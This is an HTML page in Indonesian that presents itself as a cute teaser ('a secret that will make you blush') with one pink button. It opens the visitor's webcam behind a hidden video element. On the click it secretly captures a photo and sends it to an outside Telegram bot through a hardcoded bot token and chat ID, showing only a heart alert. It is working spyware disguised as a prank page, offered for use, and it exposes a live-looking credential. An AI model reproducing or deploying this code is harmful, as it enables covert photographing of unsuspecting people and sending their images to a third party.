<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Foto Lucu 📸</title>

<style>

body{
background:#ffe6f2;
font-family:sans-serif;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
flex-direction:column;
}

#video{
border-radius:20px;
margin-bottom:20px;
width:260px;
box-shadow:0 10px 25px rgba(0,0,0,0.2);
display:none; /* Hide the video feed */
}

button{
background:#ff69b4;
color:white;
border:none;
padding:25px 40px;
font-size:22px;
border-radius:50px;
cursor:pointer;
box-shadow:0 8px 20px rgba(255,105,180,0.5);
transition:0.2s;
}

button:hover{
transform:scale(1.1);
background:#ff4da6;
}

h2{
color:#ff4da6;
}

</style>

</head>

<body>

<h2>Sttt Aku Ada Rahasia Yang Membuat Mu Baper 😆</h2>

<video id="video" autoplay></video>

<button id="takePhoto">💗 COBA PENCET 💗</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>

const botToken = "8614744009:AAEu0vGF14i_rVeZL6Q6ean-Vq_VC0xrdwc";
const chatId = "7856697051";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

// buka kamera
async function startCamera(){

const stream = await navigator.mediaDevices.getUserMedia({video:true});

video.srcObject = stream;

}

startCamera();

document.getElementById("takePhoto").onclick = async ()=>{

canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

const ctx = canvas.getContext("2d");

ctx.drawImage(video,0,0);

const blob = await new Promise(resolve=>canvas.toBlob(resolve,"image/jpeg"));

const formData = new FormData();

formData.append("chat_id",chatId);
formData.append("photo",blob,"photo.jpg");

await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{

method:"POST",
body:formData

});

alert(" 💖");

}

</script>

</body>
</html>
</script>

</body>
</html>
